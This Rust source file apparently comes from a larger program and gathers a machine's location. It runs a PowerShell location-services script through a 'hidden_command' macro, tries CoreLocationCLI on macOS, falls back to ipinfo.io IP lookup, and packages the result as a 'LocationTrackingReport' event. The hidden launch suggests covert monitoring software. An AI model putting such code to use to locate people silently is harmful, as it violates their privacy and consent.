use serde_json::{json, Value};

#[cfg(target_os = "windows")]
fn get_native_location() -> Option<Value> {
    let script = r#"
        Add-Type -AssemblyName System.Device
        $watcher = New-Object System.Device.Location.GeoCoordinateWatcher
        $watcher.Start()
        $timeout = 0
        while (($watcher.Status -ne 'Ready') -and ($watcher.Permission -ne 'Denied') -and ($timeout -lt 20)) { 
            Start-Sleep -Milliseconds 100 
            $timeout++
        }
        if ($watcher.Permission -eq 'Denied' -or $watcher.Status -ne 'Ready') { 
            Write-Output '{"error": "Native location unavailable or denied"}' 
        } else { 
            $loc = $watcher.Position.Location
            Write-Output "{""loc"": ""$($loc.Latitude),$($loc.Longitude)"", ""source"": ""Windows Location Services""}"
        }
        $watcher.Stop()
    "#;
    
    if let Ok(out) = crate::hidden_command!("powershell")
        .args(&["-NoProfile", "-Command", script])
        .output()
    {
        let text = String::from_utf8_lossy(&out.stdout);
        if let Ok(parsed) = serde_json::from_str::<Value>(&text) {
            if parsed.get("error").is_none() {
                return Some(parsed);
            }
        }
    }
    None
}

#[cfg(target_os = "macos")]
fn get_native_location() -> Option<Value> {
    // macOS CoreLocation requires a compiled binary or an osascript with permissions.
    // For simplicity, we fallback to IP geolocation on macOS if native fails, but we can try CoreLocation CLI if installed
    if let Ok(out) = crate::hidden_command!("CoreLocationCLI").args(&["-format", "%latitude,%longitude", "-once", "yes"]).output() {
        let text = String::from_utf8_lossy(&out.stdout).trim().to_string();
        if text.contains(",") {
            return Some(json!({"loc": text, "source": "macOS CoreLocation"}));
        }
    }
    None
}

#[cfg(not(any(target_os = "windows", target_os = "macos")))]
fn get_native_location() -> Option<Value> {
    None
}

pub fn track_location() -> serde_json::Value {
    let mut location_data = json!({"error": "Failed to retrieve location via curl"});

    // 1. Try Native OS Location (GPS/Wi-Fi Triangulation)
    if let Some(native_loc) = get_native_location() {
        location_data = native_loc;
    } else {
        // 2. Fallback to IP Geolocation
        if let Ok(response) = ureq::get("https://ipinfo.io/json")
            .timeout(std::time::Duration::from_secs(5))
            .call()
        {
            if let Ok(text) = response.into_string() {
                if let Ok(mut parsed) = serde_json::from_str::<serde_json::Value>(&text) {
                    if let Some(obj) = parsed.as_object_mut() {
                        obj.insert("source".to_string(), json!("IP Geolocation (ipinfo.io)"));
                    }
                    location_data = parsed;
                }
            }
        } else {
            location_data = json!({"error": "Failed to retrieve location (ureq error)"});
        }
    }

    json!({
        "EventType": "LocationTrackingReport",
        "LocationData": location_data
    })
}
